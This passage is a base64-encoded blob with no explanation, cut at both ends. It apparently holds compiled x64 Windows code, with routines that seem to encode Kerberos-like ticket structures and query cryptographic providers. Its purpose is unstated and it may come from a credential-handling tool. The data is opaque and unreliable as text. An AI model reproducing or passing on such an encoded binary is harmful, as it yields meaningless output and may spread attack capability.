AEiL0Og0rP//SIuEJOAAAABFM8CLUAxIi8/o1tr//0iNDUuxAQDoEqz//+sOSI0NsdABAIvQ6AKs//9Ii8//FXmJAQD/w0iDxgSD+wQPgh3///9Ii0wkSP8VX4kBAEiLTCQ4/xVUiQEATI2cJLAAAAAzwEmLWyBJi2soSYvjQVxfXsPMzEyL3EmJWxBFiUsgRYlDGFVWV0FUQVVBVkFXSIPsUEGL6UWL4EiLwoXJD4QdBAAASIsITY1DCEmNU6joPZr//4XAD4TvAwAATItsJDC5BAUAAEEPt0UAZsHICGY7wQ+FvAMAAEEPt0UCSINkJCgAZsHICA+3wEmNTAUESIlMJCBEi0kEQQ/JRYXJD4ScAwAATI1EJDhIjVQkKEiNTCQg6L0EAABIi0QkKEiFwA+EegMAAEyNRCQ4SI0NK9ABAEiL0OivEAAARIu0JJAAAABIi1wkIE0D9UUz/0k73g+DHQMAAEm9AJEQtgIAAABIjQ0W0AEAQYvX6L6q//+6qAAAAI1KmP8VOIgBAEiL+EiFwA+E2QIAAESLSwRIjVAwSIMiAEEPyUWFyXQTTI1AOEiNTCQg6CoEAABIi1wkIESLSwRIgycAQQ/JRYXJdBZMjUcISI1MJCBIi9foBAQAAEiLXCQgSIsP6PsSAABIjU8ISI1XIEiJRxjovtf//0QPtxtmQcHLCEEPt8OJR3APt0MCZsHICA+3wImHjAAAAA+3QwRmwcgID7fIiU94hcl0KkiL0blAAAAA/xWFhwEASImHgAAAAEiFwHQQRItHeEiNUwZIi8joPx0BAItHeEiNXAMKiwNIg8MVD8hIY8hJA81IacmAlpgAiU9YSMH5IIlPXItD7w/ISGPISQPNSGnJgJaYAIlPYEjB+SCJT2SLQ/MPyEhjyEkDzUhpyYCWmACJT2hIwfkgiU9si0P4D8iJh4gAAACLQ/wPyIXAdBSLyEiD6QGLQwIPyIvASI1cAwZ17osDSIPDBA/IhcB0FIvISIPpAYtDAg/Ii8BIjVwDBnXuiwNIg8MEx4eQAAAAAgAAAA/IiYeYAAAAhcB0K4vQuUAAAAD/FZmGAQBIiYegAAAASIXAdBJEi4eYAAAASIvTSIvI6FEcAQCLh5gAAABIjVcgSI0NyqEBAEgD2EGwAYsDD8iLwEiNXAMESIlcJCDoTxIBAITAD4URAQAAM9JIi8/o9QwAAIXtdQlFheQPhNUAAAC6AQAAAEiLz+h7EwAASIvoSIXAD4S1AAAA9kABgHQQD7dIAmbByQgPt/GDxgTrBw+2cAGDxgJFheR0KEiNDc7NAQDoYaj//4vWSIvN6Efl//+FwHhwSI0NJLYBAOhHqP//62JMjQWevgEASIvXQYvP6IcCAABMi+BIhcB0QESLxkiL1UiLyOh9lf//hcB0EUiNDbLNAQBJi9ToCqj//+sU/xUyhQEASI0N080BAIvQ6PSn//9Ji8z/FWuFAQBEi6QkoAAAAEiLzf8VWoUBAIusJKgAAABIi8/ojw8AAEH/x0k73g+C8vz//0yLbCQwSItMJCjoFBEAAOshSI0Vj6ABAEiNDQDOAQDom6f//+vGSI0NGs4BAOiNp///SYvN/xUEhQEA6yL/FayEAQBIjQ19zgEAi9Dobqf//+sMSI0N/c4BAOhgp///M8BIi5wkmAAAAEiDxFBBX0FeQV1BXF9eXcPMzEiD7ChFM8lFjUEB6Hz7//8zwEiDxCjDzEiJXCQIV0iD7DBIg2QkIABMjQUlvAEARTPJSIvai/nohNf//0UzwEiL04vPRIvI6ED7//9Ii1wkQDPASIPEMF/DzMzMSIvESIlYCFdIg+wwTIsBSIv6M9tFiwhJg8AEQQ/JTIlA8GZEiUjqZkSJSOhBD7fBZkUDyUkDwGZEiQpmQYPBAkiJAUEPt9GNS0BmiVcC/xUchAEASIlHCEiFwHQjSI1UJCBFM8BIi8/oRRABAIXAD5nDhdt1CkiLTwj/FeiDAQCLw0iLXCRASIPEMF/DzMzMSIlcJAhIiWwkEEiJdCQYV0FUQVVIg+wgTIviQYvxM/9Ii+mNVv+NT0BIweIETYvoi99Ig8IY/xWkgwEASYkEJEg7x3RJSItVAGaJcAJJiwQkiwoPyWaJCEiNQghJi9VIi81IiUUA6AX///+L2Dv3dh1JiwwkSI1UOQhIi83o7v7//0iDxxAj2EiD7gF140iLbCRISIt0JFCLw0iLXCRASIPEIEFdQVxfw8zMzEiJXCQISIlsJBBIiXQkGFdIg+xQSIvyi+lIhdJ0MkiLQjBIhcB0KbsBAAAAZjkYdR9mOVgCdRlIiwJIhcB0EWY5GHwMZoM4A38GZjlYAncCM9u6ACAAALlAAAAA/xXSggEASIv4SIXAD4SWAAAASI0Fl7sBAESLzYXbdEdIiw5Mi0YwSIlEJECLhogAAABIjVEYSIPBCEiJVCQ4SIlMJDBJg8AITIlEJChMjQUMvwEAugAQAABIi8+JRCQg6EMRAQDrI0iJRCQoi4aIAAAATI0F/8wBALoAEAAASIvPiUQkIOgeEQEAM8mFwA+fwYXJSIvPdAfoS5T//+sJ/xUrggEASIv4SItcJGBIi2wkaEiLdCRwSIvHSIPEUF/DTIvcTYlLIE2JQxhTVVZXQVRBVUFWSIPsQEmDY7gAg2QkIABIi+kzyYvCiVQkKGaJTCQ9iEwkP0mNU8CLyDPbM/boJA0BAImEJIgAAACFwA+ImwEAAEyNRCQgSI1UJDBIi83o6QMAAESLdCQghcB0EEGLxkGL3oPgB3QFK9iDwwhED7dlMLlAAAAAQYPECkGL1P8VgYEBAEiL+EiFwHQuSItNAEQPt0UwSItVOEiJCEiNSApmRIlACOgxFwEAQYvEQYv0g+AHdAUr8IPGCEiLRCQ4RItoBEGDxQRBi8VBi+2D4Ad0BSvog8UISIN8JDAAD4TlAAAASIX/D4TRAAAASIuEJJgAAACNVG5IuUAAAAAD04kQ/xX+gAEASIuMJJAAAABIiUQkIEiJAUiFwA+EnQAAAINgBABIi1QkMESJcAxMi3QkIMcABAAAALgBAAAAQYlGCEnHRhBIAAAARYtGDEmNTkiJhCSIAAAA6H4WAQBFiWYcQcdGGAoAAACL00kDVhBJiVYgRYtGHEqNDDJIi9foWBYBAItMJChFiW4sQcdGKAYAAABEi8ZNA0YgTYlGMEOJDDBFiW48QcdGOAcAAABEi8VNA0YwTYlGQEOJDDBIi0wkMP8VNYABAEiF/3QJSIvP/xUngAEAi4QkiAAAAEiDxEBBXkFdQVxfXl1bw8xIi8RIiVgISIloGEiJcCCJUBBXQVRBVUFWQVdIg+wwSIv5SI1QyEGLyE2L+UUz7UUz9ugzCwEAi+iFwA+IBwEAADP2OTcPhv0AAABIjV8IgzsGdAWDOwd1KUiLQwgz0kyNZAcESItEJCBEi0AESYvM6H8VAQCDOwZ1BU2L7OsDTYv0/8ZIg8MQOzdyw02F7Q+EswAAAE2F9g+EqgAAAEiLRCQgi5QkgAAAALsRAAAATI1MJChEi8NJi8//UDCL6IXAD4iBAAAASItEJCCLVCRoSItMJChMi8f/UBhIi0QkIEiLTCQoSYvV/1AgSItEJCBIjUwkKP9QKEiLRCQgi5QkgAAAAEyNTCQoRIvDSYvP/1Awi+iFwHgwSItEJCBIi0wkKE2LxYtQBP9QGEiLRCQgSItMJChJi9b/UCBIi0QkIEiNTCQo/1AoSItcJGBIi3QkeIvFSItsJHBIg8QwQV9BXkFdQVxfw8xIiVwkCEiJbCQQSIl0JBhXQVRBVUFWQVdIg+wgD7c5M9tNi/GDxwxFi/hMi+pEi9dMi+FBg+IDdAiNQwRBK8ID+EiLbCRwuUAAAACLVQAD1/8VWn4BAEiL8Eg7w3RqQQ+3BCSLXQBJixZmQYlFAEEPt0QkAkyLw0iLzkWJfQRmQYlFAuj+EwEAQQ+3RCQCSI1MMwxI0ehIiQQzQQ+3BCTR6IlEMwhFD7cEJEmLVCQI6NITAQBJiw7/Fet9AQABfQBJiTa7AQAAAEiLbCRYSIt0JGCLw0iLXCRQSIPEIEFfQV5BXUFcX8PMTIvcSYlbIEmJUxBVVldBVEFVQVZBV0iB7CABAAAzwEiL+U2L+I1ICESL8EmJQxhBiUMIiUQkPEiLB0iJRCRESItHCGaJTCQySIlEJExIi0cQSI1PMEiJRCRUSItHGE2NSxhIiUQkXEiLRyBIjVQkdEiJRCRkSItHKEG4BAACAEiJRCRsSY1DCMZEJDABxkQkMRDHRCQ0zMzMzMdEJEAAAAIASIlEJCDobP7//0iNhCRgAQAASI1PQEyNjCRwAQAASI1UJHxBuAgAAgBIiUQkIOhD/v//SI2EJGABAABIjU9QTI2MJHABAABIjZQkhAAAAEG4DAACAEiJRCQg6Bf+//9IjYQkYAEAAEiNT2BMjYwkcAEAAEiNlCSMAAAAQbgQAAIASIlEJCDo6/3//0iNhCRgAQAASI1PcEyNjCRwAQAASI2UJJQAAABBuBQAAgBIiUQkIOi//f//SI2EJGABAABIjY+AAAAATI2MJHABAABIjZQknAAAAEG4GAACAEiJRCQg6JD9//8Pt4eSAAAARIunnAAAAEQPt5+QAAAASIuvoAAAAIu0JGABAABmiYQkpgAAAIuHlAAAAGZEiZwkpAAAAImEJKgAAACLh5gAAABEiaQksAAAAMeEJLQAAAAcAAIARo0s5QQAAACJhCSsAAAARAPuuUAAAABBi9X/FcV7AQBIi9hIhcB0V0iLlCRwAQAATIvGSIvI6IARAQBEiSQeRYXkdB1IjVQeBE2LxEiLRQBIg8UISIkCSIPCCEmD6AF160iLjCRwAQAA/xVuewEASImcJHABAABEiawkYAEAAIuHqAAAAPMPb4esAAAASI2PwAAAAImEJLgAAABIjYQkYAEAAEyNjCRwAQAA8w9/hCS8AAAASI2UJMwAAABBuCAAAgBIiUQkIOhp/P//SI2EJGABAABIjY/QAAAATI2MJHABAABIjZQk1AAAAEG4JAACAEiJRCQg6Dr8//9Ii6/gAAAAD7ZFAYucJGABAAC5QAAAAESNJIUIAAAAx4Qk3AAAACgAAgBFjWwkBEQD60GL1f8Vr3oBAEiL8EiFwHQ9SIuUJHABAABMi8NIi8joahABAA+2RQFIjUwzBEWLxEiL1YkEM+hTEAEASIuMJHABAAD/FWd6AQBBi93rCEiLtCRwAQAAi4foAAAAM+2JhCTgAAAAi4fsAAAAjU1AiYQk5AAAAIuH8AAAAImsJAgBAACJhCToAAAAi4f0AAAAiawkDAEAAImEJOwAAABIi4f4AAAAiawkEAEAAEiJhCTwAAAASIuHAAEAAImsJBQBAABIiYQk+AAAAIuHCAEAAImsJBgBAACJhCQAAQAAi4cMAQAAiYQkBAEAAI2D3AAAAIlEJDiNg+wAAACL0EGJB/8Vs3kBAEiL+EiLhCRoAQAASIk4SDv9dClIjVQkMEiLz0G47AAAAOhjDwEASI2P7AAAAESLw0iL1uhRDwEARI11AUg79XQJSIvO/xVheQEAQYvGSIucJHgBAABIgcQgAQAAQV9BXkFdQVxfXl3DzMzMQFNIg+wgSIvZSI0NUMUBAOirm///SI1LWOjiyv//SI0NI7EBAOiWm///SI1LYOjNyv//SI0NDrEBAOiBm///SI1LaOi4yv//SIsTTI1DCEiNDULFAQDoIQEAAEiLUxhMjUMgSI0NVsUBAOgNAQAASItTMEyNQzhIjQ1qxQEA6PkAAABIg3tQAHQQSI1TSEiNDXvFAQDoJpv//4uTiAAAAEiNDYHFAQDoFJv//4uLiAAAAOh1AAAAi1Nwi8roXwEAAEiNDZDFAQBMi8Do8Jr//0iDu4AAAAAAdB5IjQ3HxQEA6Nqa//+LU3hIi4uAAAAARTPA6IDJ//+Lk4wAAACLyugbAQAARIuLkAAAAEiNDaXFAQBMi8DopZr//0iNDf7FAQBIg8QgW+mUmv//SIlcJAhIiXQkEFdIg+wgi/Ez20iNPeKSAQCNSxCLxtPoqAF0D0iLF0iNDdXFAQDoYJr////DSIPHCIP7EHLbSItcJDBIi3QkOEiDxCBfw8xIiVwkCEiJbCQQSIl0JBhXSIPsIDPtSYv4SIvaSDvNdA9Ii9FIjQ1ZnwEA6BSa//9IO910Og+/E0iNDYXFAQDoAJr//w+39WY7awJzLg+3xkiNDYXFAQBIA8BIjVTDCOjgmf//Zv/GZjtzAnLg6wxIjQ12xQEA6MmZ//9IO/10D0iNDXXFAQBIi9fotZn//0iLXCQwSItsJDhIi3QkQEiDxCBfw7h/////O8gPj8kAAAAPhLsAAAC4ef///zvIf150VIH5a////3REgfls////dDSB+XP///90JIH5dP///3QUgfl4////D4XvAAAASI0Fb8cBAMNIjQX/xQEAw0iNBUfGAQDDSI0Fz8cBAMNIjQXvxwEAw0iNBZfHAQDDgfl6////dESB+Xv///90NIH5fP///3Qkgfl9////dBSB+X7///8PhZMAAABIjQUjxgEAw0iNBWvGAQDDSI0F08QBAMNIjQUjxwEAw0iNBcvGAQDDSI0Fq8UBAMOD+RF/SnRAg/mAdDOFyXQng/kBdBqD+QJ0DYP5A3VESI0FDMUBAMNIjQXcxAEAw0iNBazEAQDDSI0FVMQBAMNIjQXcxQEAw0iNBWTHAQDDg+kSdC+D6QJ0IoPpA3QVg/kBdAhIjQWYxwEAw0iNBSjGAQDDSI0F+MUBAMNIjQXYxAEAw0iNBVDHAQDDzMzMSIXJD4TcAAAASIlcJAhXSIPsIEiL2UiLCeiCAQAASI17CEiF/3QTSItPCEiFyXQK/xWGdQEASIlHCEiLSxjoXQEAAEiNeyBIhf90E0iLTwhIhcl0Cv8VYXUBAEiJRwhIi0sw6DgBAABIjXs4SIX/dBNIi08ISIXJdAr/FTx1AQBIiUcISI17SEiF/3QTSItPCEiFyXQK/xUgdQEASIlHCEiLi4AAAABIhcl0Df8VCnUBAEiJg4AAAABIi4ugAAAASIXJdA3/FfF0AQBIiYOgAAAASIvL/xXhdAEASItcJDBIg8QgX8PMzEiLxEiJWAhIiWgQSIlwGEiJeCBBVEiD7CBFM+RIi/lBjXQkAUmL3Ek7zHRrD7dBAo1OP//ISGPQSMHiBEiDwhj/FZZ0AQBIi9hJO8R0SQ+3D0GL7GaJCA+3TwJmiUgCZkQ7ZwJzMYvFSAPASI1UwwhIjUzHCOhaxP///8Uj8A+3RwI76HLgQTv0dQxIi8v/FUB0AQBIi9hIi2wkOEiLdCRASIt8JEhIi8NIi1wkMEiDxCBBXMPMzMxIiVwkCEiJbCQQSIl0JBhXSIPsIDPtSIvZSDvNdD2L9WY7aQJzLEiNeRBIjUf4SDvFdBFIiw9IO810Cf8V23MBAEiJBw+3QwL/xkiDxxA78HLYSIvL/xXBcwEASItcJDBIi2wkOEiLdCRASIPEIF/DSIlcJAhXSIPsILoCAAAASIv5xkQkOAWNSj7/FZRzAQBIi9hIhcB0B8YAYcZAAQBIiUQkSEiFwA+EwAAAALoCAAAAjUo+/xVpcwEASIXAdAfGADDGQAEASIlEJEBIhcAPhJgAAABFM8lIjVQkOLECRY1BAegUgf//SI1MJEAz0kyLwOiRgP//SI1PCOhAgv//SI1MJECyAUyLwOh5gP//SIsP6JEJAABIjUwkQLICTIvA6GKA//9Ei4+YAAAATIuHoAAAAIqXkAAAAIqPjAAAAOinCgAASI1MJECyA0yLwOg0gP//SItUJEBIhdJ0D0iNTCRI6Jx+//9Ii1wkSEiLw0iLXCQwSIPEIF/DzEiJXCQISIlsJBBWV0FVSIPsMEG9AgAAAEiL6YvyQY1NPkmL1f8VfnIBAEiL2EiFwHQHxgB2xkABAEiJRCQgSIXAD4R0AQAASYvVuUAAAAD/FVNyAQBIhcB0B8YAMMZAAQBIiUQkaEiFwA+ETAEAAEUzyUiNVCRgQYrNQY15AcZEJGAFRIvH6PV///9IjUwkaDPSTIvA6HJ///9IjVQkYEUzyUSLx0GKzcZEJGAW6M5///9IjUwkaECK10yLwOhKf///jU8/SYvV/xXacQEASIv4SIXAdAfGADDGQAEASIlEJGBIhcB0Z4X2dDGLlZgAAAC5QAAAAP8VrHEBAEiL8EiFwHQ6RIuFmAAAAEiLlaAAAABIi8joZAcBAOsLSIvN6ND9//9Ii/BIhfZ0EkiNTCRgSIvW6E99//9Ii3wkYEiNTCRoTIvHQYrV6L5+//9Ii83ofgAAAEiL+EiFwHRE9kABgHQSD7dAAmbByAhED7fIQYPBBOsIRA+2SAFFA81Mi8cz0jPJ6OYIAABIjUwkaLIDTIvA6HN+//9Ii8//Ff5wAQBIi1QkaEiF0nQPSI1MJCDo0nz//0iLXCQgSItsJFhIi8NIi1wkUEiDxDBBXV9ew8zMzEBTVVZXQVRBVkFXSIPsQEG/AgAAAEyL4UWNdz5Ji9dBi87/FaxwAQBIi+hIhcB0B8YAfcZAAQBIiUQkMEiFwA+ERQIAAEmL10GLzv8Vg3ABAEiL2EiFwHQHxgAwxkABAEiJRCQoSIXAD4QcAgAASYvXQYvO/xVacAEASIv4SIXAdAfGAKDGQAEASIlEJCBIhcAPhNwBAABJi9dBi87/FTFwAQBIi/BIhcB0B8YAMMZAAQBIiYQkmAAAAEiFwA+EmQEAAEmL10GLzv8VBXABAEiFwHQHxgAwxkABAEiJhCSQAAAASIXAD4RZAQAARYtEJHhJi5QkgAAAAEGKTCRw6FEIAABIjYwkkAAAADPSTIvA6CN9//9JjUwkOOjRfv//SI2MJJAAAACyAUyLwOgHff//SYtMJDDoHQYAAEiNjCSQAAAAQYrXTIvA6Op8//8zwEUzyYmEJIkAAABBi4QkiAAAAEiNlCSIAAAAD8hFjUEFsQOJhCSJAAAAxoQkiAAAAADoJn3//0iNjCSQAAAAsgNMi8DooHz//0mNTCRY6M59//9IjYwkkAAAALIFTIvA6IR8//9JjUwkYOiyff//SI2MJJAAAACyBkyLwOhofP//SY1MJGjoln3//0iNjCSQAAAAsgdMi8DoTHz//0mNTCQI6Pp9//9IjYwkkAAAALIITIvA6DB8//9Jiwwk6EcFAABIjYwkkAAAALIJTIvA6BV8//9Ii5QkkAAAAEiF0nQVSI2MJJgAAADod3r//0iLtCSYAAAASIX2dBJIjUwkIEiL1uhdev//SIt8JCBIhf90EkiNTCQoSIvX6EZ6//9Ii1wkKEiF23QSSI1MJDBIi9PoL3r//0iLbCQwSIvFSIPEQEFfQV5BXF9eXVvDSIlcJAhIiWwkEEiJdCQYV0FUQVVBVkFXSIPscL4CAAAATIv6SIv5RI1mPkiL1kWL8EGLzP8V/m0BADPtTIvoSDvFdAfGAGNAiGgBSIlEJGBIO8UPhEIEAABIi9ZBi8z/FdNtAQBIO8V0B8YAMECIaAFIiUQkIEg7xQ+EHAQAADPARTPJSI2UJLgAAACJhCS5AAAAi4eIAAAARY1BBQ/IsQNAiKwkuAAAAImEJLkAAADoW3v//0iNTCQgTIvAM9Lo2Hr//0SLR3hIi5eAAAAAik9w6OEFAABIjUwkILIBTIvA6LZ6//9IjU846GV8//9IjUwkIECK1kyLwOidev//SItPMOi0AwAASI1MJCCyA0yLwOiFev//SIvWQYvM/xUVbQEASIvYSDvFdAfGAKRAiGgBSIlEJDBIO8UPhKIAAABIi9ZBi8z/FexsAQBIO8V0B8YAMECIaAFIiUQkKEg7xXRuRTPJSI2UJLgAAABAis5FjUEBQIisJLgAAADoj3r//0iNTCQoM9JMi8DoDHr//0iL1kGLzP8VnGwBAEg7xXQHxgAEQIhoAUiNTCQoTIvAsgHo5Xn//0iLVCQoSDvVdA9IjUwkMOhNeP//SItcJDBIO910DUiNTCQgSIvT6DZ4//9IjU9Y6Ol6//9IjUwkILIFTIvA6KJ5//9IjU9Y6NF6//9IjUwkILIGTIvA6Ip5//9IjU9g6Ll6//9IjUwkILIHTIvA6HJ5//9IjU9o6KF6//9IjUwkILIITIvA6Fp5//9Ii9ZBi8z/FeprAQBMi+BIO8V0B8YAqkCIaAFIiUQkMEg7xQ+EFwIAALtAAAAASIvWi8v/Fb1rAQBIi/BIO8V0B8YAMECIaAFIiUQkKEg7xQ+E2AEAAL8CAAAAi8tIi9f/FZBrAQBIO8V0B8YAMECIaAFIiUQkOEg7xQ+ElwEAAEUzyUiNlCS4AAAAQIrPRY1BAcaEJLgAAAAB6C95//9IjUwkODPSTIvA6Kx4//9Ii9eLy/8VPWsBAEiL6EiFwHQHxgChxkABAEiJRCRQSIXAD4QmAQAASIvXi8v/FRVrAQBIi9hIhcB0B8YABMZAAQBIiUQkSEiFwA+E7AAAAEiL17lAAAAA/xXqagEASIv4SIXAdAfGADDGQAEASIlEJFhIhcAPhKoAAAC6AgAAAI1KPv8Vv2oBAEiFwHQHxgAwxkABAEiJRCRASIXAdG9FM8m4gAAAAEiNlCS4AAAARY1BAmbByAhBishmiYQkuAAAAOhZeP//SI1MJECygEyLwOjWd///RTPJRYvGSYvXsQToOnj//0iNTCRAsgFMi8Dot3f//0iLVCRASIXSdA9IjUwkWOgfdv//SIt8JFhIhf90EkiNTCRISIvX6Ah2//9Ii1wkSEiF23QSSI1MJFBIi9Po8XX//0iLbCRQSIXtdA1IjUwkOEiL1ejadf//SItUJDgz7Ug71XQPSI1MJCjoxHX//0iLdCQoSDv1dBJIjUwkMEiL1uitdf//TItkJDBMO+V0DUiNTCQgSYvU6JZ1//9Ii1QkIEg71XQPSI1MJGDognX//0yLbCRgTI1cJHBJi8VJi1swSYtrOEmLc0BJi+NBX0FeQV1BXF/DQFNVVldBVUiD7DCKAb8CAAAASIvxjU8+SIvXiEQkYP8VV2kBADPtSDvFdAfGADBAiGgBSIlEJGhIO8UPhPIAAABFM8lIjVQkYECKz0WNaQFFi8Xo/Hb//0iNTCRoM9JMi8DoeXb//0GNTT9Ii9f/FQhpAQBIi9hIO8V0B8YAoUCIaAFIiUQkcEg7xQ+EogAAAEiL17lAAAAA/xXdaAEASDvFdAfGADBAiGgBSIlEJGBIO8V0bA+3/WY7bgJzTA+3x0iNTCQgRYrFSAPASI1UxgjolPQAADvFfCFED7dEJCBIi1QkKEyNTCRgsRvoY3b//0iNTCQg6HX0AABmQQP9Zjt+AnK5SItEJGBIO8V0EkiNTCRwSIvQ6EB0//9Ii1wkcEg73XQNSI1MJGhIi9PoKXT//0iLRCRoSIPEMEFdX15dW8PMSIlcJBiIVCQQiEwkCFdIg+wwugIAAABBi9lJi/iNSj7/FRJoAQBIhcB0B8YAMMZAAQBIiUQkIEiFwHRvRTPJSI1UJECxAkWNQQHowXX//0iNTCQgM9JMi8DoPnX//4B8JEAAdCJFM8lIjVQkSLECRY1BAeiYdf//SI1MJCCyAUyLwOgVdf//RTPJRIvDSIvXsQToeXX//0iNTCQgsgJMi8Do9nT//0iLRCQgSItcJFBIg8QwX8PMzEiJXCQQiEwkCFdIg+wgSIv6ugIAAABBi9iNSj7/FV5nAQBIhcB0B8YAMMZAAQBIiUQkSEiFwHRGRTPJSI1UJDCxAkWNQQHoDXX//0iNTCRIM9JMi8DoinT//0UzyUSLw0iL17EE6O50//9IjUwkSLIBTIvA6Gt0//9Ii0QkSEiLXCQ4SIPEIF/DzMzMQFNIg+wgSI0N78YBALslAgDA/xWUZQEASIkF9e8CAEiFwA+EngEAAEiNFd3GAQBIi8j/FWxlAQBIiQXd7wIASIXAD4R+AQAAgz1J8gIABQ+GbwEAAEiDPa/vAgAAD4VhAQAASI0NssYBAP8VPGUBAEiJBZXvAgBIhcAPhEYBAABIjRWlxgEASIvI/xUUZQEASIsNde8CAEiNFa7GAQBIiQV/7wIA/xX5ZAEASIsNWu8CAEiNFaPGAQBIiQVs7wIA/xXeZAEASIsNP+8CAEiNFZjGAQBIiQVZ7wIA/xXDZAEASIsNJO8CAEiNFY3GAQBIiQVG7wIA/xWoZAEASIsNCe8CAEiNFYrGAQBIiQUz7wIA/xWNZAEASIsN7u4CAEiNFYfGAQBIiQUg7wIA/xVyZAEASIsN0+4CAEiNFYTGAQBIiQUN7wIA/xVXZAEASIsNuO4CAEiNFYnGAQBIiQX67gIA/xU8ZAEASIM9tO4CAABIiQXt7gIAdE1Igz2r7gIAAHRDSIM9qe4CAAB0OUiDPafuAgAAdC9Igz2l7gIAAHQlSIM9o+4CAAB0G0iDPaHuAgAAdBFIgz2f7gIAAHQHSIXAdAIz24vDSIPEIFvDzMxAU0iD7CBIiw0v7gIAM9tIO8t0Sf8VymMBADvDdD9IiR0v7gIASIkdMO4CAEiJHTHuAgBIiR0y7gIASIkdM+4CAEiJHTTuAgBIiR017gIASIkdNu4CAEiJHTfuAgBIiw3g7QIASDvLdBr/FXVjAQBIiw3W7QIAO8NID0XLSIkNye0CADPASIPEIFvDzEiJXCQISIl0JBBXSIPsQDPbSI0NiMUBAIvzSIlcJDDo7Ib//0yNXCRgM8lMiVwkKOtki1QkYLlAAAAA/xVXZAEASIv4SDvDdD9IjUQkYEyNTCRoRTPASIlEJCgz0ovOSIl8JCD/FfZgAQA7w3QRSI0NW8UBAEyLx4vW6JGG//9Ii8//FQhkAQBIjUQkYP/GSIlEJCiLzkyNTCRoRTPAM9JIiVwkIP8VtWABADvDdYP/FYtjAQA9AwEAAHQU/xV+YwEASI0NH8UBAIvQ6ECG//9IOR3Z7AIAdG1IjQ2IxQEA6CuG//9IjVQkMEiNTCRg/xUL7QIAO8N8OUiLTCQwORl2KEiL+0yLQQhIjQ3AxAEAi9NNiwQ46PWF//9Ii0wkMP/DSIPHCDsZctv/FdjsAgDrFP8VCGMBAEiNDVnFAQCL0OjKhf//SItcJFBIi3QkWDPASIPEQF/DQFNIg+wwg2QkUABIjQV2wAEATI1MJFhMjQW6xQEASIlEJCDoDLb//0iLTCRY6HoRAABIi1QkWEiNDbLFAQBEi8CL2Ohwhf//TI0NMQAAAEyNRCRQM9KLy/8V6mABAIXAdRT/FYBiAQBIjQ3RxQEAi9DoQoX//zPASIPEMFvDzMxIg+woTItEJFBBixCNQgFBiQBMi8FIjQ3cwwEA6BeF//+4AQAAAEiDxCjDzEiJXCQISIlsJBBWV0FUQVVBV0iD7GBIg2QkIABMjQX5mQEARTPJSIv6i/HoWLX//0xj4EiNBaK/AQBMjUwkQEyNBebEAQBIi9eLzkiJRCQg6DO1//9Ii0wkQOihEAAATI1MJFBMjQWxxQEAi9hIjQWcxQEASIvXi85IiUQkIOgFtf//TIt8JFBIi1QkQEiNDaDFAQBNi89Ei8PobYT//zPSgcsAwAAAjUoKRTPARIvLTIl8JCD/FbFfAQBMi+hIhcAPhDYDAAAz0kiLyDPt/xXAXwEASIvYSIXAD4QNAwAASI0FbXwBADP2M/+LFLiDZCQoAEiDZCQgAEUzyUUzwEiLy/8VXF8BAImEJKAAAACFwHUq/xUjYQEASI0NdMkBAIvQ6OWD////xkj/x0iNBSF8AQCD/gVys+mPAgAAi9C5QAAAAEgD0v8VR2EBAEiL8EiFwA+EcwIAAIuMJKAAAABFM8lFM8CJTCQoSIlEJCBIjQXeewEAixS4SIvL/xXiXgEAO4QkoAAAAA+FIAIAAEiNDTbCAQBMi8aL1ehsg///g6QkoAAAAABFM8BBjVACTI2MJKAAAABIi8v/FcxeAQCFwA+EwAEAAIuUJKAAAAC5QAAAAP8VumABAEiL+EiFwA+EiAEAAEyNjCSgAAAATIvAugIAAABIi8v/FY1eAQCFwA+EUwEAAEiDfwgATI0FmcQBAEiNFZLEAQBMD0VHCEiDPwBIjQ2axAEASA9FF+jZgv//TI1cJDBIjYQkqAAAAEyJXCQoTI1MJDhFM8C6AAABAEiLy0iJRCQg/xX8XQEAhcAPhOMAAABEi4QkqAAAAEGD+AF0J0GD+AJ0GEiNFfmrAQBIjQUK0wEAQYP4/0gPRNDrEEiNFdnSAQDrB0iNFbDSAQBIjQ1xxAEA6FyC//+LlCSoAAAAg/r/dFdIi0wkOEyNRCRI/xWoXAEAhcB0GUiLVCRIM8no6AYAAEiLTCRI/xWFXAEA6xT/FU1fAQBIjQ1uxAEAi9DoD4L//4N8JDAAdGpIi0wkODPS/xVDXAEA61tIgz2R6AIAAHQgSItMJDgz0uibBgAAg3wkMAB0PkiLTCQ4/xW56AIA6zFIjQ2gxAEA6MOB///rI/8V614BAEiNDUzFAQDrDf8V3F4BAEiNDe3FAQCL0Oiegf//SIvP/xUVXwEATYXkdRFIjQ29hgEA6ISB//9NheR0NkyLRCRAi5QkoAAAAE2Lz0iLy0iJdCQoiWwkIOjbCQAA6xT/FYdeAQBIjQ1IxgEAi9DoSYH//0iLzv8VwF4BAEiL00mLzf8VvFwBAP/FSIvYSIXASI0FbXkBAA+F+vz//7oBAAAASYvN/xWJXAEA6xT/FTleAQBIjQ0qxwEAi9Do+4D//0yNXCRgM8BJi1swSYtrOEmL40FfQV1BXF9ew0iJXCQIVVZXQVRBVUFWQVdIgeygAAAASINkJGgASINkJCAATI0FxpUBAEUzyUyL8kSL+cdEJHgBAAAA6Byx//9MjYwk+AAAAIlEJFBIjQWluAEATI0FLscBAEmL1kGLz0iJRCQg6PKw//9Mi6wk+AAAAE2F7XRDTI0lynYBADP/SYvcSIsTSYvN/xXBYAEAhcAPhLkCAABIixNJi81Ig8IG/xWpYAEAhcAPhKECAAD/x0iDwxCD/wxyyUUz5EiNBcSxAQBMjYwk+AAAAEyNBc3GAQBNheRJi9ZBi89IiUQkIE0PROXocrD//0iLtCT4AAAASIX2dENIjS0KdwEAM/9Ii91IixNIi87/FUFgAQCFwA+ESAIAAEiLE0iLzkiDwgr/FSlgAQCFwA+EMAIAAP/HSIPDEIP/EnLJM+2F7XUQRTPAM9JIi87/FeJfAQCL6EiDZCQgAEyNBWPGAQBFM8lJi9ZBi8/o8a///zPbSI09RIoBAIXAjUsgSI0FQMYBAA9F2UyNjCSAAAAATI0FlsYBAIXbSYvWQYvPSA9F+EiNBTPGAQBIiUQkIEiJvCSIAAAA6KWv//9Mi7QkgAAAAEiNDYLGAQBNi8xMiXQkME2LxUiL14lsJChIiXQkIOj+fv//SI0NP8cBAOjyfv//SGN0JFCLww0AAADwSI1MJGBEi81Ni8Qz0kiJdCRQiUQkIP8VAlkBAIXAD4QlAgAASItMJGBFM8BMjYwk8AAAAEGNUALHRCQgAQAAAP8V+FgBAIuUJPAAAAC5QAAAAIv4/xUUXAEASIvwSIXAD4TeAQAARTPthf8PhJwBAACLRCR4RIvzSItMJGBMjYwk8AAAAEyLxroCAAAAiUQkIP8Vp1gBAESL+IXAD4RPAQAASIPJ/zPASIv+8q5I99FIjVH/SIvO6B6s//9Ii9hI